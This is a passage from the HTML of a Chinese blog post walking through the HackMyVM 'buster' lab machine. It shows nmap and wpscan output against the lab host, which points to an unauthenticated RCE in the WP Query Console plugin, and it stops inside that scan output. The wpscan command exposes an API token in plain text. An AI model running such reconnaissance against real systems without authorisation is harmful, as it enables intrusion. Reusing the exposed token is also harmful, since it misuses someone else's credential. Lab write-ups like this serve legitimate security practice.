@@ -1,0 +1,608 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/letter-k.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/letter-k.svg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"guayu-kakeru.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="HMV-buster复盘,ta0神做的靶机">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HMV-buster">
+<meta property="og:url" content="https://guayu-kakeru.github.io/posts/7142.html">
+<meta property="og:site_name" content="guayu-kakeru">
+<meta property="og:description" content="HMV-buster复盘,ta0神做的靶机">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67a3428cd0e0a243d4fbf739.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67a342afd0e0a243d4fbf73c.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67a342b0d0e0a243d4fbf73d.png">
+<meta property="article:published_time" content="2025-02-05T06:36:29.000Z">
+<meta property="article:modified_time" content="2025-02-05T13:19:17.243Z">
+<meta property="article:author" content="guayu-kakeru">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="HMV">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/67a3428cd0e0a243d4fbf739.png">
+
+<link rel="canonical" href="https://guayu-kakeru.github.io/posts/7142.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>HMV-buster | guayu-kakeru</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">guayu-kakeru</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">12</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">9</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">44</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://guayu-kakeru.github.io/posts/7142.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="guayu-kakeru">
+      <meta itemprop="description" content="一年过后，你会希望从今天就开始行动。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="guayu-kakeru">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HMV-buster
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-02-05 14:36:29 / 修改时间：21:19:17" itemprop="dateCreated datePublished" datetime="2025-02-05T14:36:29+08:00">2025-02-05</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">靶场</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/hmv/" itemprop="url" rel="index"><span itemprop="name">hmv</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+      
+        <div class="out-img-topic">
+          <img src="https://pic1.imgdb.cn/item/67a3096ad0e0a243d4fbe85c.png" class="img-topic">
+        </div>
+      
+      
+        <p>HMV-buster复盘,ta0神做的靶机</p>
+<span id="more"></span>
+<p><img src="https://pic1.imgdb.cn/item/67a3428cd0e0a243d4fbf739.png"></p>
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap -A 192.168.240.231</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">05</span> <span class="number">14</span>:<span class="number">48</span> CST</span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">240.231</span> (<span class="number">192.168</span>.<span class="number">240.231</span>)</span><br><span class="line">Host is up (<span class="number">0.0020</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span> open  ssh     OpenSSH <span class="number">7.9</span>p1 Debian <span class="number">10</span><span class="operator">+</span>deb10u4 (protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="params">ssh-hostkey:</span> </span><br><span class="line">|   <span class="number">2048</span> c2:<span class="number">91</span>:d9:a5:f7:a3:<span class="number">98</span>:<span class="number">1</span>f:c1:<span class="number">4</span>a:<span class="number">70</span>:<span class="number">28</span>:aa:ba:a4:<span class="number">10</span> (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">3</span>e:<span class="number">1</span>f:c9:eb:c0:<span class="number">6</span>f:<span class="number">24</span>:<span class="number">06</span>:fc:<span class="number">52</span>:<span class="number">5</span>f:<span class="number">2</span>f:<span class="number">1</span>b:<span class="number">35</span>:<span class="number">33</span>:ec (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> ec:<span class="number">64</span>:<span class="number">87</span>:<span class="number">04</span>:<span class="number">9</span>a:<span class="number">4</span>b:<span class="number">32</span>:fe:<span class="number">2</span>d:<span class="number">1</span>f:<span class="number">9</span>a:b0:<span class="number">81</span>:d3:<span class="number">7</span>c:cf (ED25519)</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http    nginx <span class="number">1.14</span>.<span class="number">2</span></span><br><span class="line">| http-robots.<span class="params">txt:</span> <span class="number">1</span> disallowed entry </span><br><span class="line">|_<span class="operator">/</span>wp-admin<span class="symbol">/</span></span><br><span class="line">|<span class="params">_http-server-header:</span> nginx<span class="symbol">/1.14.2</span></span><br><span class="line">|<span class="params">_http-title:</span> bammmmuwe</span><br><span class="line">|<span class="params">_http-generator:</span> WordPress <span class="number">6.7</span>.<span class="number">1</span></span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">6</span>A:<span class="number">4</span>C:<span class="number">9</span>F:<span class="number">02</span>:<span class="number">22</span>:<span class="number">6</span>E (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line">Service <span class="params">Info:</span> <span class="params">OS:</span> Linux; <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">2.05</span> ms <span class="number">192.168</span>.<span class="number">240.231</span> (<span class="number">192.168</span>.<span class="number">240.231</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">15.13</span> seconds</span><br></pre></td></tr></table></figure></div>
+<p>开放80和22 直接去web找信息</p>
+<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><p>访问web端 发现这个web是用的wordpress<br><img src="https://pic1.imgdb.cn/item/67a342afd0e0a243d4fbf73c.png"><br>用wpscan 扫一下用户和插件 然后去看看有没有什么漏洞 漫长的等待~</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># wpscan --api-token r4NahZxa7hHyx6tcZVYdfivP0YNXqmTaJXwqgMatwmE --url http://192.168.240.231/ -e u,ap --plugins-detection aggressive</span></span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        <span class="symbol">/</span> <span class="symbol">/</span>  __ \ <span class="symbol">/</span> ____|</span><br><span class="line">          \ \  <span class="operator">/</span>\  <span class="symbol">/</span> <span class="operator">/</span>| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \<span class="symbol">/</span>  \<span class="symbol">/</span> <span class="symbol">/</span> |  ___<span class="symbol">/</span> \___ \ <span class="symbol">/</span> __|<span class="symbol">/</span> _` | &#x27;_ \</span><br><span class="line">            \  <span class="operator">/</span>\  <span class="symbol">/</span>  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \<span class="symbol">/</span>  \<span class="symbol">/</span>   |_|    |_____<span class="symbol">/</span> \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version <span class="number">3.8</span>.<span class="number">27</span></span><br><span class="line">       Sponsored by Automattic <span class="operator">-</span> https:<span class="operator">//</span>automattic.com<span class="symbol">/</span></span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] <span class="params">URL:</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.231</span><span class="symbol">/</span> [<span class="number">192.168</span>.<span class="number">240.231</span>]</span><br><span class="line">[<span class="operator">+</span>] <span class="params">Started:</span> Wed Feb  <span class="number">5</span> <span class="number">14</span>:<span class="number">57</span>:<span class="number">35</span> <span class="number">2025</span></span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] Headers</span><br><span class="line"> | Interesting <span class="params">Entry:</span> <span class="params">Server:</span> nginx<span class="symbol">/1.14.2</span></span><br><span class="line"> | Found <span class="params">By:</span> Headers (Passive Detection)</span><br><span class="line"> | <span class="params">Confidence:</span> <span class="number">100</span>%</span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] robots.txt <span class="params">found:</span> http:<span class="symbol">//192.168.240.231/robots.txt</span></span><br><span class="line"> | Interesting <span class="params">Entries:</span></span><br><span class="line"> |  <span class="operator">-</span> <span class="operator">/</span>wp-admin<span class="symbol">/</span></span><br><span class="line"> |  <span class="operator">-</span> <span class="symbol">/wp-admin/admin-ajax.php</span></span><br><span class="line"> | Found <span class="params">By:</span> Robots Txt (Aggressive Detection)</span><br><span class="line"> | <span class="params">Confidence:</span> <span class="number">100</span>%</span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] XML-RPC seems to be <span class="params">enabled:</span> http:<span class="symbol">//192.168.240.231/xmlrpc.php</span></span><br><span class="line"> | Found <span class="params">By:</span> Direct Access (Aggressive Detection)</span><br><span class="line"> | <span class="params">Confidence:</span> <span class="number">100</span>%</span><br><span class="line"> | <span class="params">References:</span></span><br><span class="line"> |  <span class="operator">-</span> http:<span class="symbol">//codex.wordpress.org/XML-RPC_Pingback_API</span></span><br><span class="line"> |  <span class="operator">-</span> https:<span class="operator">//</span>www.rapid7.com<span class="operator">/</span>db<span class="operator">/</span>modules<span class="operator">/</span>auxiliary<span class="operator">/</span>scanner<span class="operator">/</span>http<span class="operator">/</span>wordpress_ghost_scanner<span class="symbol">/</span></span><br><span class="line"> |  <span class="operator">-</span> https:<span class="operator">//</span>www.rapid7.com<span class="operator">/</span>db<span class="operator">/</span>modules<span class="operator">/</span>auxiliary<span class="operator">/</span>dos<span class="operator">/</span>http<span class="operator">/</span>wordpress_xmlrpc_dos<span class="symbol">/</span></span><br><span class="line"> |  <span class="operator">-</span> https:<span class="operator">//</span>www.rapid7.com<span class="operator">/</span>db<span class="operator">/</span>modules<span class="operator">/</span>auxiliary<span class="operator">/</span>scanner<span class="operator">/</span>http<span class="operator">/</span>wordpress_xmlrpc_login<span class="symbol">/</span></span><br><span class="line"> |  <span class="operator">-</span> https:<span class="operator">//</span>www.rapid7.com<span class="operator">/</span>db<span class="operator">/</span>modules<span class="operator">/</span>auxiliary<span class="operator">/</span>scanner<span class="operator">/</span>http<span class="operator">/</span>wordpress_pingback_access<span class="symbol">/</span></span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] WordPress readme <span class="params">found:</span> http:<span class="symbol">//192.168.240.231/readme.html</span></span><br><span class="line"> | Found <span class="params">By:</span> Direct Access (Aggressive Detection)</span><br><span class="line"> | <span class="params">Confidence:</span> <span class="number">100</span>%</span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] The external WP-Cron seems to be <span class="params">enabled:</span> http:<span class="symbol">//192.168.240.231/wp-cron.php</span></span><br><span class="line"> | Found <span class="params">By:</span> Direct Access (Aggressive Detection)</span><br><span class="line"> | <span class="params">Confidence:</span> <span class="number">60</span>%</span><br><span class="line"> | <span class="params">References:</span></span><br><span class="line"> |  <span class="operator">-</span> https:<span class="symbol">//www.iplocation.net/defend-wordpress-from-ddos</span></span><br><span class="line"> |  <span class="operator">-</span> https:<span class="symbol">//github.com/wpscanteam/wpscan/issues/1299</span></span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] WordPress version <span class="number">6.7</span>.<span class="number">1</span> identified (Latest, released on <span class="number">202</span>4-<span class="number">1</span>1-<span class="number">21</span>).</span><br><span class="line"> | Found <span class="params">By:</span> Meta Generator (Passive Detection)</span><br><span class="line"> |  <span class="operator">-</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.231</span><span class="operator">/</span>, <span class="params">Match:</span> &#x27;WordPress <span class="number">6.7</span>.<span class="number">1</span>&#x27;</span><br><span class="line"> | Confirmed <span class="params">By:</span> Rss Generator (Aggressive Detection)</span><br><span class="line"> |  <span class="operator">-</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.231</span><span class="operator">/</span>feed<span class="operator">/</span>, <span class="symbol">&lt;generator&gt;</span>https:<span class="operator">//</span>wordpress.org<span class="operator">/</span><span class="operator">?</span>v<span class="operator">=</span><span class="number">6.7</span>.<span class="number">1</span><span class="operator">&lt;</span><span class="operator">/</span>generator<span class="operator">&gt;</span></span><br><span class="line"> |  <span class="operator">-</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.231</span><span class="operator">/</span>comments<span class="operator">/</span>feed<span class="operator">/</span>, <span class="symbol">&lt;generator&gt;</span>https:<span class="operator">//</span>wordpress.org<span class="operator">/</span><span class="operator">?</span>v<span class="operator">=</span><span class="number">6.7</span>.<span class="number">1</span><span class="operator">&lt;</span><span class="operator">/</span>generator<span class="operator">&gt;</span></span><br><span class="line"></span><br><span class="line">[i] The main theme could not be detected.</span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] Enumerating All Plugins (via Aggressive Methods)</span><br><span class="line"> Checking Known Locations <span class="operator">-</span> <span class="params">Time:</span> <span class="number">01</span>:<span class="number">58</span>:<span class="number">02</span> <span class="operator">&lt;=</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">&gt;</span> (<span class="number">108898</span> <span class="symbol">/</span> <span class="number">108898</span>) <span class="number">100.00</span>% <span class="params">Time:</span> <span class="number">01</span>:<span class="number">58</span>:<span class="number">02</span></span><br><span class="line">[<span class="operator">+</span>] Checking Plugin Versions (via Passive and Aggressive Methods)</span><br><span class="line"></span><br><span class="line">[i] Plugin(s) <span class="params">Identified:</span></span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] akismet</span><br><span class="line"> | <span class="params">Location:</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.231</span><span class="operator">/</span>wp-content<span class="operator">/</span>plugins<span class="operator">/</span>akismet<span class="symbol">/</span></span><br><span class="line"> | Last <span class="params">Updated:</span> <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">04</span>T21:<span class="number">01</span>:<span class="number">00.000</span>Z</span><br><span class="line"> | <span class="params">Readme:</span> http:<span class="symbol">//192.168.240.231/wp-content/plugins/akismet/readme.txt</span></span><br><span class="line"> | [<span class="operator">!</span>] The version is out of date, the latest version is <span class="number">5.3</span>.<span class="number">6</span></span><br><span class="line"> |</span><br><span class="line"> | Found <span class="params">By:</span> Known Locations (Aggressive Detection)</span><br><span class="line"> |  <span class="operator">-</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.231</span><span class="operator">/</span>wp-content<span class="operator">/</span>plugins<span class="operator">/</span>akismet<span class="operator">/</span>, <span class="params">status:</span> <span class="number">200</span></span><br><span class="line"> |</span><br><span class="line"> | <span class="params">Version:</span> <span class="number">5.3</span>.<span class="number">5</span> (<span class="number">100</span>% confidence)</span><br><span class="line"> | Found <span class="params">By:</span> Readme <span class="operator">-</span> Stable Tag (Aggressive Detection)</span><br><span class="line"> |  <span class="operator">-</span> http:<span class="symbol">//192.168.240.231/wp-content/plugins/akismet/readme.txt</span></span><br><span class="line"> | Confirmed <span class="params">By:</span> Readme <span class="operator">-</span> ChangeLog Section (Aggressive Detection)</span><br><span class="line"> |  <span class="operator">-</span> http:<span class="symbol">//192.168.240.231/wp-content/plugins/akismet/readme.txt</span></span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] feed</span><br><span class="line"> | <span class="params">Location:</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.231</span><span class="operator">/</span>wp-content<span class="operator">/</span>plugins<span class="operator">/</span>feed<span class="symbol">/</span></span><br><span class="line"> |</span><br><span class="line"> | Found <span class="params">By:</span> Known Locations (Aggressive Detection)</span><br><span class="line"> |  <span class="operator">-</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.231</span><span class="operator">/</span>wp-content<span class="operator">/</span>plugins<span class="operator">/</span>feed<span class="operator">/</span>, <span class="params">status:</span> <span class="number">200</span></span><br><span class="line"> |</span><br><span class="line"> | The version could not be determined.</span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] wp-query-console</span><br><span class="line"> | <span class="params">Location:</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.231</span><span class="operator">/</span>wp-content<span class="operator">/</span>plugins<span class="operator">/</span>wp-query-console<span class="symbol">/</span></span><br><span class="line"> | Latest <span class="params">Version:</span> <span class="number">1.0</span> (up to date)</span><br><span class="line"> | Last <span class="params">Updated:</span> <span class="number">201</span>8-<span class="number">0</span>3-<span class="number">16</span>T16:<span class="number">03</span>:<span class="number">00.000</span>Z</span><br><span class="line"> | <span class="params">Readme:</span> http:<span class="symbol">//192.168.240.231/wp-content/plugins/wp-query-console/README.txt</span></span><br><span class="line"> |</span><br><span class="line"> | Found <span class="params">By:</span> Known Locations (Aggressive Detection)</span><br><span class="line"> |  <span class="operator">-</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.231</span><span class="operator">/</span>wp-content<span class="operator">/</span>plugins<span class="operator">/</span>wp-query-console<span class="operator">/</span>, <span class="params">status:</span> <span class="number">403</span></span><br><span class="line"> |</span><br><span class="line"> | [<span class="operator">!</span>] <span class="number">1</span> vulnerability <span class="params">identified:</span></span><br><span class="line"> |</span><br><span class="line"> | [<span class="operator">!</span>] <span class="params">Title:</span> WP Query Console <span class="operator">&lt;=</span> <span class="number">1.0</span> <span class="operator">-</span> Unauthenticated Remote Code Execution</span><br><span class="line"> |     <span class="params">References:</span></span><br><span class="line"> |      <span class="operator">-</span> https:<span class="symbol">//wpscan.com/vulnerability/f911568d-5f79-49b7-8ce4-fa0da3183214</span></span><br><span class="line"> |      <span class="operator">-</span> https:<span class="operator">//</span>cve.mitre.org<span class="operator">/</span>cgi-bin<span class="operator">/</span>cvename.cgi<span class="operator">?</span>name<span class="operator">=</span>CVE-<span class="number">202</span>4-<span class="number">50498</span></span><br><span class="line"> |      <span class="operator">-</span> https:<span 